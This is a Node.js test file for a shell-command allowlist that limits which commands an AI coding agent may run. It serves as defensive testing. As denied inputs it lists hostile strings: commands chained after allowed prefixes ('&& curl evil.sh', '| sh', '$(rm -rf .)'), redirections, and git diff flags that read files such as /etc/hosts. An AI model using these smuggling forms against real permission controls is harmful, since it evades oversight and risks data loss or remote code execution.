const test = require("node:test");
const assert = require("node:assert/strict");
const { isBashCommandAllowed, prefixesFromBashRules } = require("./bash-command-policy.js");

const ALLOWED = ["git diff", "git status", "npm test"];
const allowed = (cmd) => isBashCommandAllowed(cmd, ALLOWED);

test("allows an exact allowed prefix and the prefix followed by arguments", () => {
  assert.equal(allowed("git diff"), true);
  assert.equal(allowed("git status"), true);
  assert.equal(allowed("git diff --stat"), true);
  assert.equal(allowed("git status --short"), true);
  assert.equal(allowed("git diff -- src/a.js"), true);
  assert.equal(allowed("npm test"), true);
  assert.equal(allowed("npm test -- --grep widget"), true);
});

test("tolerates leading/trailing whitespace around an allowed command", () => {
  assert.equal(allowed("  git diff --stat  "), true);
  assert.equal(allowed("\tgit status\t"), true);
});

test("denies a different command that merely shares the prefix's characters", () => {
  assert.equal(allowed("git diffx"), false);
  assert.equal(allowed("git statusfoo"), false);
  assert.equal(allowed("npm tester"), false);
  assert.equal(allowed("git"), false);
  assert.equal(allowed("git log"), false);
  assert.equal(allowed("touch probe-made.txt"), false);
  assert.equal(allowed("GIT_DIR=/x git diff"), false);
  assert.equal(allowed("git -c core.pager=sh diff"), false);
});

test("denies chaining, pipes, substitution and redirection after an allowed prefix", () => {
  for (const cmd of [
    "git diff; rm x",
    "git diff && curl evil.sh",
    "git diff || true",
    "git diff & sleep 1",
    "git status | sh",
    "git diff $(rm -rf .)",
    "git diff ${HOME}",
    "git diff $HOME",
    "git diff `rm x`",
    "git diff > out.txt",
    "git diff >> out.txt",
    "git diff < in.txt",
    "git diff 2>&1",
    "git diff (x)",
    "git diff\nrm x",
    "git diff\rrm x",
    "git diff \\\nrm x",
    "touch probe-made.txt && echo MADE",
  ]) {
    assert.equal(allowed(cmd), false, JSON.stringify(cmd));
  }
});

test("denies empty or non-string input and a missing/empty allowlist", () => {
  assert.equal(allowed(""), false);
  assert.equal(allowed("   "), false);
  assert.equal(allowed(undefined), false);
  assert.equal(allowed(null), false);
  assert.equal(allowed(42), false);
  assert.equal(isBashCommandAllowed("git diff", []), false);
  assert.equal(isBashCommandAllowed("git diff", undefined), false);
  assert.equal(isBashCommandAllowed("git diff", ["", "  "]), false);
  assert.equal(isBashCommandAllowed("git diff", [42]), false);
});

test("prefixesFromBashRules pulls the prefix out of each Bash(<prefix>:*) rule, ignoring everything else", () => {
  assert.deepEqual(
    prefixesFromBashRules(["Read", "Edit", "Bash(git diff:*)", "Bash(git status:*)", "Bash", "Bash(npm test:*)", "mcp__x"]),
    ["git diff", "git status", "npm test"],
  );
  assert.deepEqual(prefixesFromBashRules([]), []);
});

// Final-review finding 3: `git diff` is allowed so Claude can look at its
// own changes, but three of its flags turn it into something else --
// `--no-index` diffs ANY two paths on disk (a read outside the worktree),
// `--output=<file>` writes a file, and `--ext-diff` runs a configured
// external program. Refused anywhere in the argument list, in either the
// `--output x` or `--output=x` form, quoted, or abbreviated (git accepts a
// unique prefix of a long option).
test("denies git diff carrying --no-index, --output or --ext-diff in any position or form", () => {
  for (const cmd of [
    "git diff --no-index /etc/hosts a.txt",
    "git diff a.txt --no-index b.txt",
    "git diff --output=/tmp/x",
    "git diff --output /tmp/x",
    "git diff HEAD --output=x",
    "git diff --ext-diff",
    "git diff --stat --ext-diff HEAD",
    "git diff '--no-index' a b",
    'git diff "--output=x"',
    "git diff --no-ind a b",
    "git diff --outp=x",
    "git diff --ext",
  ]) {
    assert.equal(allowed(cmd), false, cmd);
  }
});

test("still allows ordinary git diff flags (and --no-ext-diff, the safe opposite)", () => {
  for (const cmd of [
    "git diff --stat",
    "git diff --no-ext-diff",
    "git diff --name-only HEAD",
    "git diff --no-color -- src/a.js",
    "git diff --exit-code",
    "git diff --",
  ]) {
    assert.equal(allowed(cmd), true, cmd);
  }
});

test("the git diff flag refusal doesn't touch other allowed commands", () => {
  assert.equal(allowed("npm test -- --output=report.txt"), true);
  assert.equal(allowed("git status --no-index"), true);
});
